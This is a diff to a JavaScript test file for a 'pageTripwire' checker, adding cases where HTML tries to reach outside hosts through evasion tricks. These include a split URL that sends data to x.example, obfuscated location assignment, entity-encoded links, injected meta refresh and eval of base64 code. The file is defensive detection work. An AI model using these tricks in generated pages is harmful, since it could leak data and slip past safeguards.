@@ -63,6 +63,28 @@ test("a page that could reach outside is refused, and says why", () => {
   for (const [html, reason] of cases) assert.equal(pageTripwire(html), reason, html);
 });
 
+test("the ways round a plain pattern are refused too", () => {
+  const tricks = [
+    `<script>const a = document.createElement("a"); a.href = "ht" + "tps://x.example/?d=" + d; a.click();</script>`,
+    `<script>globalThis["loc" + "ation"] = "//x.example"</script>`,
+    `<a href="&#104;ttps://x.example">x</a>`,
+    `<script>document.write('<meta http-equiv=refresh content="0;url=' + u + '">')</script>`,
+    `<script>el.innerHTML = '<a href="' + u + '">go</a>'</script>`,
+    `<script>el.setAttribute("href", u)</script>`,
+    `<script>eval(atob("bG9jYXRpb24="))</script>`,
+    `<script>const l = document.createElement('link'); l.rel = 'dns-prefetch'</script>`,
+    `<img src="${"x"}.png">`,
+  ];
+  for (const html of tricks) assert.notEqual(pageTripwire(html), null, html);
+});
+
+test("anchors within the page and data images are fine", () => {
+  assert.equal(
+    pageTripwire('<a href="#totals">Totals</a><img src="data:image/png;base64,AA">'),
+    null,
+  );
+});
+
 test("a plain page with the chart library passes", () => {
   const html = `<!doctype html><html><head><script src="${CHART_LIBRARY}"></script></head>
     <body><p>Location: Kannur</p><canvas id="c"></canvas>
